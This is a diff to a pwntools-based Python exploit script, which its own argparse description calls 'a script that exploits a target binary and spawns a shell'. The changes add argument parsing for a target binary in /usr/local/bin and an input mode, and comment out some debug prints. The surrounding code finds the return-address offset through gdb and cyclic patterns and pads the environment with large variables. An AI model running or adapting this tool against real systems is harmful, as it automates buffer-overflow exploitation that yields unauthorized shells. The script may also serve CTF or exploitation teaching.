@@ -5,6 +5,7 @@ import re
 import sys
 import select
 import fcntl
+import argparse
 from pwn import *
 
 log_file_path = 'strace.log'
@@ -26,6 +27,39 @@ env_vars = {
     "VAR14": "N" * 131000,
     "VAR15": "O" * 131000
 }
+
+def check_target_bin(target):
+
+    if not os.path.isfile(f'/usr/local/bin/{target}'):
+        raise argparse.ArgumentTypeError(f"Error: '{target}' does not exist.")
+    if not os.access(f'/usr/local/bin/{target}', os.X_OK):
+        raise argparse.ArgumentTypeError(f"Error: '{target}' is not executable or permission is denied.")
+    
+    return target
+    
+
+def check_args():
+
+    parser = argparse.ArgumentParser(
+        description="a script that exploits a target binary and spawns a shell"
+    )
+
+    parser.add_argument(
+        "target",
+        type=check_target_bin,
+        help="The target binary file to execute (must exist in /usr/local/bin and be executable)"
+    )
+
+    parser.add_argument(
+        "input_mode",
+        type=int,
+        choices=[0, 1],
+        help="Input mode for the target: 0 for stdin (default), 1 for command-line input"
+    )
+    args = parser.parse_args()
+
+
+    return args
 
 
 def cleanup(exit_code: int):
@@ -89,7 +123,6 @@ def locate_ra(pattern, target):
     while True:
         output = gdb_proc.stdout.readline()
         if "Program received signal SIGSEGV" in output:
-            print(output)
             break
 
     gdb_proc.stdin.write("info registers\n")
@@ -116,10 +149,10 @@ def locate_ra(pattern, target):
             eip_value = line.split()[1]  # Extract the hexadecimal value (second column)
             break
 
-    print(eip_value)
+    # print(eip_value)
 
     offset = cyclic_find(int(eip_value, 16))
-    print(f"offset: {offset}")
+    # print(f"offset: {offset}")
     return offset
 
 def locate_ra2(pattern, target):
@@ -280,16 +313,14 @@ def detect_execve():
 
 def main():
         
-    if len(sys.argv) != 2:
-        print("No executable file provided")
+    if len(sys.argv) != 3:
         sys.exit(1)
 
-    target = sys.argv[1]
-    
+    args = check_args()
 
-    if not os.access(f'/usr/local/bin/{target}', os.X_OK):
-        print(f"{target}: Permission denied")
-        sys.exit(1)
+    # Extract arguments
+    target = args.target
+    input_mode = args.input_mode
 
     context.log_level='warn'
     # context.log_level = 'debug'
